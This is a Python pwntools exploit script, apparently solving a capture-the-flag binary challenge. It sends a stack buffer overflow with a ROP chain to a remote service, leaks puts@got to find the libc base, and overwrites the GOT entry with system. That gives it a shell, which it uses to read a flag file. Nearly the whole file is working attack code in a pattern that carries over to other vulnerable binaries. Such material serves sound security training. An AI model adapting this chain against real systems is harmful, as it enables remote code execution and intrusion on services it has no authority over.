from pwn import *
import time


context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# 0x0000000000401263 : pop rdi ; ret
# 0x0000000000401261 : pop rsi ; pop r15 ; ret
# 0x000000000040125f : pop rbp ; pop r14 ; pop r15 ; ret
# 0000000000401070 <puts@plt>:
# 0000000000401090 <gets@plt>:
# 0x403368 <puts@got.plt>
bss = 0x403460


def main():
    r = remote("10.113.184.121", 10053)
    # r = process("./share/chal")
    # attach(
    #     r,
    #     gdbscript="""
    #         br main
    #     """,
    # )
    r.recvuntil(b"Try your best :")
    ropc = flat(
        [
            0x0000000000401263,  # pop rdi ; ret
            0x403368,  # puts@got
            0x0000000000401070,  # puts@plt
            0x0000000000401263,  # pop rdi ; ret
            bss,  # bss
            0x0000000000401090,  # gets@plt
            0x0000000000401263,  # pop rdi ; ret
            0x403368,  # puts@got
            0x0000000000401090,  # gets@plt
            0x0000000000401263,  # pop rdi ; ret
            bss,  # bss
            0x0000000000401070,  # puts@plt
        ]
    )
    payload = b"A" * 0x28 + ropc
    r.sendline(payload)
    assert r.recvline() == b"boom !\n"
    put_got = u64(r.recvline().strip().ljust(8, b"\x00"))
    log.info(f"puts@got: {hex(put_got)}")
    glibc = ELF("./libc.so.6", checksec=False)
    # glibc = ELF("/usr/lib/libc.so.6")
    log.info(f"puts@libc: {hex(glibc.symbols['puts'])}")
    libc_base = put_got - glibc.symbols["puts"]
    log.info(f"libc_base: {hex(libc_base)}")
    system = libc_base + glibc.symbols["system"]
    log.info(f"system: {hex(system)}")
    r.sendline(b"/bin/sh\x00")
    r.sendline(flat([system]))
    time.sleep(0.1)
    r.sendline(b"cat /home/chal/flag.txt")
    print(r.recv().decode().strip())


if __name__ == "__main__":
    main()
